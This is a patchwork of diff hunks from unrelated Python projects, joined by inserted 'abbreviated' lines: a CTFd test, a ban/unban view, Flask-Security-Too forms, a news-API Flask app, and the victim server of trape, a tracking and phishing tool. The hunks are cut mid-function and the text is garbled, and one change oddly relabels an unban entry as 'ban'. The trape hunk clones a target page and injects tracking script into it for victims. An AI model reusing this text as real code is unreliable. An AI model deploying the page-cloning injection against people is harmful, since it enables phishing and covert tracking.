@@ -207,14 +207,19 @@ def test_that_request_path_hijacking_works_properly():
 
 
 def test_theme_fallback_config():
-    app = create_ctfd()
+
+    class ThemeFallbackConfig(TestingConfig):
+        THEME_FALLBACK = False
+
+    app = create_ctfd(config=ThemeFallbackConfig)
     try:
-        os.mkdir(os.path.join(app.root_path, "themes", "foo"))
+        os.mkdir(os.path.join(app.root_path, "themes", "foo_fallback"))
     except OSError:
         pass
 
     with app.app_context():
-        set_config("ctf_theme", "foo")
+        app.config["THEME_FALLBACK"] = False
+        set_config("ctf_theme", "foo_fallback")
         assert app.config["THEME_FALLBACK"] == False
         with app.test_client() as client:
             try:
@@ -222,11 +227,6 @@ def test_theme_fallback_config():
             except TemplateNotFound:
                 pass
             try:
-                r = client.get("/themes/foo/static/js/pages/main.dev.js")
-            except TemplateNotFound:
-                pass
-    destroy_ctfd(app)
-
 
 
 ## ... source file continues with no further request examples...
@@ -658,7 +658,7 @@ class UnbanUser(MethodView):
                     data.append(
                         {
                             "id": user.id,
-                            "type": "unban",
+                            "type": "ban",
                             "reverse": "ban",
                             "reverse_name": _("Ban"),
                             "reverse_url": url_for("management.ban_user",
@@ -2226,6 +2226,7 @@ The Flask-Security-Too project is provided as open source under the
 # forms.py
 
 import inspect
+import typing as t
 
 ~~from flask import Markup, current_app, request
 from flask_login import current_user
@@ -2242,24 +2243,24 @@ from wtforms import (
     ValidationError,
     validators,
 )
-from wtforms.fields.html5 import EmailField
+
+try:  # pragma: no cover
+    from wtforms.fields import EmailField
+except ImportError:
+    from wtforms.fields.html5 import EmailField
 from wtforms.validators import StopValidation
 
 from .babel import is_lazy_string, make_lazy_string
 from .confirmable import requires_confirmation
 from .utils import (
-    _,
-    _datastore,
-    config_value,
-    do_flash,
 
 
 ## ... source file abbreviated to get to request examples ...
 
 
-
-class RegisterFormMixin:
     submit = SubmitField(get_form_field_label("register"))
+
+    username: t.ClassVar[Field]
 
     def to_dict(self, only_user):
 
@@ -2313,22 +2314,22 @@ class ForgotPasswordForm(Form, UserEmailFormMixin):
 ## ... source file abbreviated to get to request examples ...
 
 
-
-    def __init__(self, *args, **kwargs):
-        super().__init__(*args, **kwargs)
-
-    def validate(self):
-        if not super().validate():
-            return False
-        if not self.user.is_active:
             self.email.errors.append(get_message("DISABLED_ACCOUNT")[0])
             return False
         return True
 
 
+login_email_field = EmailField(
+    get_form_field_label("email"), validators=[email_required]
+)
+
+login_string_field = StringField(
+    get_form_field_label("email"), validators=[email_required]
+)
+
+
 class LoginForm(Form, NextFormMixin):
 
-    email = EmailField(get_form_field_label("email"), validators=[email_required])
     password = PasswordField(
         get_form_field_label("password"), validators=[password_required]
     )
@@ -2339,7 +2340,7 @@ class LoginForm(Form, NextFormMixin):
         super().__init__(*args, **kwargs)
         if not self.next.data:
 ~~            self.next.data = request.args.get("next", "")
-        self.remember.default = config_value("DEFAULT_REMEMBER_ME")
+        self.remember.default = cv("DEFAULT_REMEMBER_ME")
         if (
             current_app.extensions["security"].recoverable
             and not self.password.description
@@ -2382,7 +2383,7 @@ class RegisterForm(ConfirmRegisterForm, NextFormMixin):
     def validate(self):
         if not super().validate():
             return False
-        if not config_value("UNIFIED_SIGNIN"):
+        if not cv("UNIFIED_SIGNIN"):
             if not self.password_confirm.data or not self.password_confirm.data.strip():
                 self.password_confirm.errors.append(
                     get_message("PASSWORD_NOT_PROVIDED")[0]
@@ -2949,6 +2950,7 @@ import configparser
 import json
 import logging
 import os
+from typing import Union
 
 import requests
 import requests_cache
@@ -2974,6 +2976,8 @@ requests_cache.install_cache(cache_name='news_cache',
                              expire_after=300)
 
 APP = Flask(__name__)
+SESSION = requests.Session()
+SESSION.headers.update({'Authorization': API_KEY})
 
 
 @APP.route('/', methods=['GET', 'POST'])
@@ -2998,14 +3002,13 @@ def category(category):
         country = get_cookie('country')
         if country is not None:
             params.update({'country': country})
-        response = requests.get(TOP_HEADLINES,
-                                params=params,
-                                headers={'Authorization': API_KEY})
+        response = SESSION.get(TOP_HEADLINES, params=params)
         if response.status_code == 200:
             pages = count_pages(response.json())
             if page > pages:
                 page = pages
-                return redirect(url_for('category', category=category, page=page))
+                return redirect(
+                    url_for('category', category=category, page=page))
             articles = parse_articles(response.json())
             return render(articles, page, pages, country, category)
         elif response.status_code == 401:
@@ -3014,7 +3017,7 @@ def category(category):
 
 
 @APP.route('/search/<string:query>', methods=['GET', 'POST'])
-def search(query):
+def search(query: str):
 ~~    page = request.args.get('page', default=1, type=int)
     if page < 1:
         return redirect(url_for('search', query=query, page=1))
@@ -3026,9 +3029,7 @@ def search(query):
     }
 ~~    if request.method == 'POST':
         return do_post(page, category='search', current_query=query)
-    response = requests.get(EVERYTHING,
-                            params=params,
-                            headers={'Authorization': API_KEY})
+    response = SESSION.get(EVERYTHING, params=params)
     pages = count_pages(response.json())
     if page > pages:
         page = pages
@@ -3062,7 +3063,7 @@ def do_post(page, category='general', current_query=None):
     return redirect(url_for('category', category=category, page=page))
 
 
-def parse_articles(response):
+def parse_articles(response: dict) -> list:
     parsed_articles = []
     if response.get('status') == 'ok':
         for article in response.get('articles'):
@@ -3075,16 +3076,16 @@ def parse_articles(response):
 ## ... source file abbreviated to get to request examples ...
 
 
+                'source':
                     article['source']['name']
             })
     return parsed_articles
 
 
-def count_pages(response):
-    pages = 0
+def count_pages(response: dict) -> int:
     if response.get('status') == 'ok':
-        pages = (-(-response.get('totalResults', 0) // PAGE_SIZE))
-    return pages
+        return (-(-response.get('totalResults', 0) // PAGE_SIZE))
+    return 0
 
 
 def render(articles, page, pages, country, category):
@@ -3099,9 +3100,8 @@ def render(articles, page, pages, country, category):
                            pages=pages)
 
 
-def get_cookie(key):
-~~    cookie_value = request.cookies.get(key)
-    return cookie_value
+def get_cookie(key: str) -> Union[str, None]:
+~~    return request.cookies.get(key)
 
 
 if __name__ == '__main__':
@@ -3502,6 +3502,8 @@ from core.db import Database
 import os
 import sys
 import platform
+import urllib
+import requests
 from multiprocessing import Process
 
 trape = core.stats.trape
@@ -3512,13 +3514,11 @@ db = Database()
 class victim_server(object):
     @app.route("/" + trape.victim_path)
     def homeVictim():
-        opener = urllib2.build_opener()
-        headers = victim_headers(request.user_agent)
-        opener.addheaders = headers
+        r = requests.get(trape.url_to_clone, headers=victim_headers2(request.user_agent))
         if (trape.type_lure == 'local'):
             html = assignScripts(victim_inject_code(render_template("/" + trape.url_to_clone), 'payload', '/', trape.gmaps, trape.ipinfo))
         else:
-            html = assignScripts(victim_inject_code(opener.open(trape.url_to_clone).read(), 'payload', trape.url_to_clone, trape.gmaps, trape.ipinfo))
+            html = assignScripts(victim_inject_code(r.content, 'payload', trape.url_to_clone, trape.gmaps, trape.ipinfo))
         return html
 
     @app.route("/register", methods=["POST"])
@@ -3611,7 +3611,7 @@ class victim_server(object):
 ~~        url = request.args.get('url')
         if url[0:4] != 'http':
             url = 'http://' + url
-        opener = urllib2.build_opener()
+        opener = urllib.request.build_opener()
         headers = victim_headers(request.user_agent)
         opener.addheaders = headers
         html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, trape.gmaps, trape.ipinfo))
